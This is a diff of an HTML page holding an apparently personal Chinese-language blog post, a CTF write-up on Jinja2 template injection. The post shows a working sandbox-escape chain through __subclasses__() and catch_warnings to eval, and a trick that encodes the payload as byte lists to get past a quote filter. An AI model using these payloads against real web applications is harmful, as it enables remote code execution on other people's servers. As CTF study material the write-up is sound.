@@ -13,11 +13,11 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta name="robots" content="" />
 <meta name="author" content="littlezz" />
-<meta name="description" content="intro 不久前 plaidctf 中有一题模板注入， 但是引号会被过滤掉， 挣扎了很久， 非常痛苦， 到最后要用 eval 任意代码执行的时候想到不能有引号没有办法构造字符串， 岂不是依然 GG。（当然最后是用其他的方法 后来想了一下绕过引号的方法。 首先模板注入的原理是在 jinja2 中可以访问对象的属性，同时列表是存在的， 这样可以通过访问列表的属性一层层的找到其他类或者是__buildtins__, 然后找出 eval进行任意代码执行， 绕过沙盒的限制 #! python3 from jinja2 import Template Template('{}'.format('{{[].__class__}}')).render() #output "<class 'list'>" 我们可以通过这种方法调用自带的函数或者对象， 通过subclasses 找到更加多的类 [].__class__.__base__.__subclasses__() print([].__class__.__base__.__subclasses__()[0]) #output type 之后利用其中的 catch_warnings 访问 globals 定位出 eval， 然后进行任意代码执行。 #python3 In [146]: [].__class__.__base__.__subclasses__()[166] Out[146]: warnings.catch_warnings In [153]: Template('{{[].__class__.__base__.__subclasses__()[166].__init__.__g ...: lobals__.__builtins__.eval("1+1")}}').render() Out[153]: '2' 绕过引号 一般情况下， %会被过滤， 但是如果引号也被过滤的话怎么构造出 ..." />
+<meta name="description" content="intro 不久前 plaidctf 中有一题模板注入， 但是引号会被过滤掉， 挣扎了很久， 非常痛苦， 到最后要用 eval 任意代码执行的时候想到不能有引号没有办法构造字符串， 岂不是依然 GG。~~（当然最后是用其他的方法~~ 后来想了一下绕过引号的方法。 首先模板注入的原理是在 jinja2 中可以访问对象的属性，同时列表是存在的， 这样可以通过访问列表的属性一层层的找到其他类或者是__buildtins__, 然后找出 eval进行任意代码执行， 绕过沙盒的限制 #! python3 from jinja2 import Template Template('{}'.format('{{[].__class__}}')).render() #output "<class 'list'>" 我们可以通过这种方法调用自带的函数或者对象， 通过subclasses 找到更加多的类 [].__class__.__base__.__subclasses__() print([].__class__.__base__.__subclasses__()[0]) #output type 之后利用其中的 catch_warnings 访问 globals 定位出 eval， 然后进行任意代码执行。 #python3 In [146]: [].__class__.__base__.__subclasses__()[166] Out[146]: warnings.catch_warnings In [153]: Template('{{[].__class__.__base__.__subclasses__()[166].__init__.__g ...: lobals__.__builtins__.eval("1+1")}}').render() Out[153]: '2' 绕过引号 一般情况下， %会被过滤， 但是如果引号也被过滤的话怎么构造出 …" />
 <meta name="keywords" content="python, 小结">
 <meta property="og:site_name" content="littlezz's Blog"/>
 <meta property="og:title" content="jinja2 模板注入绕过引号任意代码执行"/>
-<meta property="og:description" content="intro 不久前 plaidctf 中有一题模板注入， 但是引号会被过滤掉， 挣扎了很久， 非常痛苦， 到最后要用 eval 任意代码执行的时候想到不能有引号没有办法构造字符串， 岂不是依然 GG。（当然最后是用其他的方法 后来想了一下绕过引号的方法。 首先模板注入的原理是在 jinja2 中可以访问对象的属性，同时列表是存在的， 这样可以通过访问列表的属性一层层的找到其他类或者是__buildtins__, 然后找出 eval进行任意代码执行， 绕过沙盒的限制 #! python3 from jinja2 import Template Template('{}'.format('{{[].__class__}}')).render() #output "<class 'list'>" 我们可以通过这种方法调用自带的函数或者对象， 通过subclasses 找到更加多的类 [].__class__.__base__.__subclasses__() print([].__class__.__base__.__subclasses__()[0]) #output type 之后利用其中的 catch_warnings 访问 globals 定位出 eval， 然后进行任意代码执行。 #python3 In [146]: [].__class__.__base__.__subclasses__()[166] Out[146]: warnings.catch_warnings In [153]: Template('{{[].__class__.__base__.__subclasses__()[166].__init__.__g ...: lobals__.__builtins__.eval("1+1")}}').render() Out[153]: '2' 绕过引号 一般情况下， %会被过滤， 但是如果引号也被过滤的话怎么构造出 ..."/>
+<meta property="og:description" content="intro 不久前 plaidctf 中有一题模板注入， 但是引号会被过滤掉， 挣扎了很久， 非常痛苦， 到最后要用 eval 任意代码执行的时候想到不能有引号没有办法构造字符串， 岂不是依然 GG。~~（当然最后是用其他的方法~~ 后来想了一下绕过引号的方法。 首先模板注入的原理是在 jinja2 中可以访问对象的属性，同时列表是存在的， 这样可以通过访问列表的属性一层层的找到其他类或者是__buildtins__, 然后找出 eval进行任意代码执行， 绕过沙盒的限制 #! python3 from jinja2 import Template Template('{}'.format('{{[].__class__}}')).render() #output "<class 'list'>" 我们可以通过这种方法调用自带的函数或者对象， 通过subclasses 找到更加多的类 [].__class__.__base__.__subclasses__() print([].__class__.__base__.__subclasses__()[0]) #output type 之后利用其中的 catch_warnings 访问 globals 定位出 eval， 然后进行任意代码执行。 #python3 In [146]: [].__class__.__base__.__subclasses__()[166] Out[146]: warnings.catch_warnings In [153]: Template('{{[].__class__.__base__.__subclasses__()[166].__init__.__g ...: lobals__.__builtins__.eval("1+1")}}').render() Out[153]: '2' 绕过引号 一般情况下， %会被过滤， 但是如果引号也被过滤的话怎么构造出 …"/>
 <meta property="og:locale" content="en_US"/>
 <meta property="og:url" content="http://littlezz.github.io/jinja2-mo-ban-zhu-ru-rao-guo-yin-hao-ren-yi-dai-ma-zhi-xing.html"/>
 <meta property="og:type" content="article"/>
@@ -60,8 +60,8 @@
     <p>Posted on Mon 01 May 2017 in <a href="http://littlezz.github.io/category/python.html">Python</a></p>
   </header>
   <div>
-    <h3 id="intro"><a name="user-content-intro" href="#intro" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>intro</h3>
-<p>不久前 plaidctf 中有一题模板注入， 但是引号会被过滤掉， 挣扎了很久， 非常痛苦， 到最后要用 eval 任意代码执行的时候想到不能有引号没有办法构造字符串， 岂不是依然 GG。<del>（当然最后是用其他的方法</del></p>
+    <h3>intro</h3>
+<p>不久前 plaidctf 中有一题模板注入， 但是引号会被过滤掉， 挣扎了很久， 非常痛苦， 到最后要用 eval 任意代码执行的时候想到不能有引号没有办法构造字符串， 岂不是依然 GG。~~（当然最后是用其他的方法~~</p>
 <p>后来想了一下绕过引号的方法。</p>
 <p>首先模板注入的原理是在 jinja2 中可以访问对象的属性，同时列表是存在的， 这样可以通过访问列表的属性一层层的找到其他类或者是<code>__buildtins__</code>, 然后找出 <code>eval</code>进行任意代码执行， 绕过沙盒的限制</p>
 <div class="highlight"><pre><span></span><span class="ch">#! python3</span>
@@ -93,7 +93,7 @@
 </pre></div>
 
 
-<h3 id="_1"><a name="user-content-_1" href="#_1" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>绕过引号</h3>
+<h3>绕过引号</h3>
 <p>一般情况下， <code>%</code>会被过滤， 但是如果引号也被过滤的话怎么构造出 eval 可以执行的字符串呢？</p>
 <p>特别说明的是 <code>chr</code> 是没有办法在模板中调用的。因为在沙盒中这个函数是不存在的。（<code>chr</code>？不存在的。）</p>
 <p>我们可以使用数字列表转化成字节流， 之后转化成字符串的方法。</p>
@@ -108,7 +108,7 @@
 </pre></div>
 
 
-<h4 id="python3"><a name="user-content-python3" href="#python3" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>python3</h4>
+<h4>python3</h4>
 <p>利用：</p>
 <div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">jinja2</span> <span class="kn">import</span> <span class="n">Template</span>
 
@@ -125,7 +125,7 @@
 </pre></div>
 
 
-<h4 id="python2"><a name="user-content-python2" href="#python2" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>python2</h4>
+<h4>python2</h4>
 <p>python2 的<code>catch_warnings</code>在<code>[59]</code>的位置， 另外 python2 的 eval 不接受字节流， 需要特别调用<code>__str__</code>方法来转化成字符串。其余和 python3相同。</p>
 <div class="highlight"><pre><span></span><span class="n">Template</span><span class="p">(</span><span class="s1">&#39;{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__.__builtins__.eval([].__class__.__base__.__subclasses__()[6]([95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 115, 121, 115, 34, 41, 46, 118, 101, 114, 115, 105, 111, 110]).__str__())}}&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">render</span><span class="p">()</span>
 
@@ -133,7 +133,7 @@
 </pre></div>
 
 
-<hr />
+<hr>
 <p>2017-05-01 20:33:47</p>
   </div>
   <div class="tag-cloud">
@@ -168,7 +168,7 @@
   },
   "image": "/images/logo.jpg",
   "url": "http://littlezz.github.io/jinja2-mo-ban-zhu-ru-rao-guo-yin-hao-ren-yi-dai-ma-zhi-xing.html",
-  "description": "intro 不久前 plaidctf 中有一题模板注入， 但是引号会被过滤掉， 挣扎了很久， 非常痛苦， 到最后要用 eval 任意代码执行的时候想到不能有引号没有办法构造字符串， 岂不是依然 GG。（当然最后是用其他的方法 后来想了一下绕过引号的方法。 首先模板注入的原理是在 jinja2 中可以访问对象的属性，同时列表是存在的， 这样可以通过访问列表的属性一层层的找到其他类或者是__buildtins__, 然后找出 eval进行任意代码执行， 绕过沙盒的限制 #! python3 from jinja2 import Template Template('{}'.format('{{[].__class__}}')).render() #output "<class 'list'>" 我们可以通过这种方法调用自带的函数或者对象， 通过subclasses 找到更加多的类 [].__class__.__base__.__subclasses__() print([].__class__.__base__.__subclasses__()[0]) #output type 之后利用其中的 catch_warnings 访问 globals 定位出 eval， 然后进行任意代码执行。 #python3 In [146]: [].__class__.__base__.__subclasses__()[166] Out[146]: warnings.catch_warnings In [153]: Template('{{[].__class__.__base__.__subclasses__()[166].__init__.__g ...: lobals__.__builtins__.eval("1+1")}}').render() Out[153]: '2' 绕过引号 一般情况下， %会被过滤， 但是如果引号也被过滤的话怎么构造出 ..."
+  "description": "intro 不久前 plaidctf 中有一题模板注入， 但是引号会被过滤掉， 挣扎了很久， 非常痛苦， 到最后要用 eval 任意代码执行的时候想到不能有引号没有办法构造字符串， 岂不是依然 GG。~~（当然最后是用其他的方法~~ 后来想了一下绕过引号的方法。 首先模板注入的原理是在 jinja2 中可以访问对象的属性，同时列表是存在的， 这样可以通过访问列表的属性一层层的找到其他类或者是__buildtins__, 然后找出 eval进行任意代码执行， 绕过沙盒的限制 #! python3 from jinja2 import Template Template('{}'.format('{{[].__class__}}')).render() #output "<class 'list'>" 我们可以通过这种方法调用自带的函数或者对象， 通过subclasses 找到更加多的类 [].__class__.__base__.__subclasses__() print([].__class__.__base__.__subclasses__()[0]) #output type 之后利用其中的 catch_warnings 访问 globals 定位出 eval， 然后进行任意代码执行。 #python3 In [146]: [].__class__.__base__.__subclasses__()[166] Out[146]: warnings.catch_warnings In [153]: Template('{{[].__class__.__base__.__subclasses__()[166].__init__.__g ...: lobals__.__builtins__.eval("1+1")}}').render() Out[153]: '2' 绕过引号 一般情况下， %会被过滤， 但是如果引号也被过滤的话怎么构造出 …"
 }
 </script></body>
 </html>
